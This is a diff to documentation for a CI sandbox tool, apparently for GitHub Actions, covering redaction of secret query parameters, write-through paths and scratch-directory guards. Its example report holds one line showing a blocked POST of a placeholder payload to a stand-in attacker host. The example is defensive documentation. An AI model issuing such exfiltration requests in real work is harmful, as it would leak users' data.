@@ -16,6 +16,7 @@ details.
 - [Requests that never arrived whole](#requests-that-never-arrived-whole)
 - [Connections that failed](#connections-that-failed)
 - [AWS access key check](#aws-access-key-check)
+- [Hidden query parameters](#hidden-query-parameters)
 - [Traffic artifact](#traffic-artifact)
 - [Filesystem audit](#filesystem-audit)
 - [CA trust variables](#ca-trust-variables)
@@ -697,6 +698,28 @@ expected, which the `restrict` run itself would not fail on. **Communication det
 among the other requests, marked `(restrict would block: <reason>)`, and the traffic artifact has
 them too.
 
+## Hidden query parameters
+
+**Communication details** replaces the value of a query parameter named `access_key`,
+`access_token`, `api_key`, `api_token`, `auth`, `authorization`, `auth_token`, `client_secret`,
+`code`, `credential`, `credentials`, `id_token`, `jwt`, `key`, `passwd`, `password`, `pat`,
+`private_token`, `pwd`, `refresh_token`, `secret`, `session`, `session_token`, `sig`, `signature`,
+`subscription-key`, `token`, `x-amz-security-token`, `x-amz-signature`, `x-api-key` or
+`x-goog-signature`. The name is matched ignoring case, `-`, `_`, `.` and any trailing `[...]`, so
+`api_key`, `api-key`, `api.key`, `apiKey`, `APIKEY` and `api_key[0][]` are one name. What the
+brackets hold is not looked at, so `user[password]` keeps its value. A parameter starts after `&`,
+`;` or any `?`, so one in a URL carried inside another's value is replaced too. The replaced value
+runs to the next `&`, so a `;` or `?` inside a secret does not leave the rest of it showing:
+
+```
+✅ 00:04.212: GET https://cdn.example.com/x.tar.gz?X-Amz-Signature=***&X-Amz-Expires=3600 -> 200 (4.1MB)
+🚫 00:05.003: POST https://evil.example.com/?d=BASE64PAYLOAD -> not-allowed
+```
+
+The [traffic artifact](#traffic-artifact) keeps every value as it was sent.
+[Credentials in a URL](./security.md#credentials-in-a-url) explains why the summary hides these
+and what it still shows.
+
 ## Traffic artifact
 
 `upload_traffic_artifact: true` uploads the report's timeline as a `traffic.json` inside an artifact
@@ -709,7 +732,8 @@ request that followed them, and service-discovery lookups with the record type t
 
 This is also the form to keep where the report is an audit trail rather than something to read: in
 `filesystem_mode: persistent` a later step can add to the Job Summary, but not to an artifact
-already uploaded. See [Known Limitations](./security.md#known-limitations).
+already uploaded. See
+[What the sandbox does not stop](./security.md#what-the-sandbox-does-not-stop).
 
 | Field         | Always | Notes                                                                                                               |
 | ------------- | ------ | ------------------------------------------------------------------------------------------------------------------- |
@@ -930,6 +954,9 @@ this:
   non-isolated step and give it to the runner user:
   `sudo install -d -o "$(id -u)" -g "$(id -g)" /etc/something`.
 - A created directory stays after the step, as with `docker run -v`, even if the step fails.
+  Buildcage never removes one. A directory removed on the runner while a step runs, by a parallel
+  step outside any sandbox or a `persistent` sandbox that can write its parent, is detached from
+  every sandbox binding it, and that step's later writes there may not reach the runner.
 - `write_through:` accepts files as well as directories, but only a path that's **already** a file
   when the step starts; a missing target is always created as a directory (see above), never a file.
   A file entry is bind-mounted file-to-file (the same technique the `inspect` engine already uses to
@@ -962,6 +989,11 @@ a regular file fails the step (GitHub's runner creates both before the step). Th
 unless `write_through` names the file or a directory it is in (`$RUNNER_TEMP`, say), by any of the
 paths it is shown at; only then are they mediated and written back, without a bind of their own.
 
+A copy the command replaced with a symlink, FIFO or directory, or made unreadable, is read back as
+empty and fails the step; it is never followed or blocked on. The
+backing copies sit under `/var/tmp/buildcage-<uid>`, which the sandbox cannot see, so the command
+reaches them only through the bind and cannot move them aside.
+
 `$GITHUB_OUTPUT` is written back trimmed to the entries the runner can read (a dropped entry fails
 the step). `$GITHUB_STEP_SUMMARY` is written back as the command left it, after the report, cut to
 what the report leaves of GitHub's limit, or replaced by a note when it is over 1 MiB on its own
@@ -974,7 +1006,7 @@ The sandbox covers the host's `/run` with an empty tmpfs to keep host service so
 Naming a path under `/run`, or `/run` itself, re-exposes it, for a service socket a later step
 needs, say. That reopens an outbound path through the daemon behind it, and all of `/run` leaves the
 outbound restriction nearly pointless, so do it deliberately. See
-[Isolation Mechanisms](./security.md#isolation-mechanisms).
+[Isolation mechanisms](./security.md#isolation-mechanisms).
 
 ### Reserved paths
 
@@ -999,8 +1031,15 @@ written back.
 Naming a reserved path, or anything under one, fails the step rather than being quietly ignored.
 Naming a directory that contains them (`write_through: /etc`) is fine: writes elsewhere under it
 reach the host, and only the reserved paths themselves stay read-only. The same applies to the filesystems the sandbox mounts fresh, such as `/proc`
-and `/dev`, and to the sandbox's own scratch directory under `/var/tmp`; see
-[Known Limitations](./security.md#known-limitations).
+and `/dev`, and to the sandbox's own scratch directory under `/var/tmp`.
+
+An entry naming the scratch directory, `/var/tmp/buildcage-<uid>`, or an ancestor of it is rejected
+outright, since the writable exceptions are recursive bind-mounts and that directory holds the run's
+`mount --rbind /` rootfs, so allowing it would re-expose the whole host `/` as a writable copy.
+Entries are normalized first, so `/var/tmp/./buildcage-<uid>` is caught by the same check. This
+guards against an operator's `write_through:` value, not against the command itself. The literal
+`/` is the opt-out below and skips the guard by design; an entry that only _resolves_ to `/` is
+rejected rather than read as that opt-out.
 
 ### The `/` opt-out
 
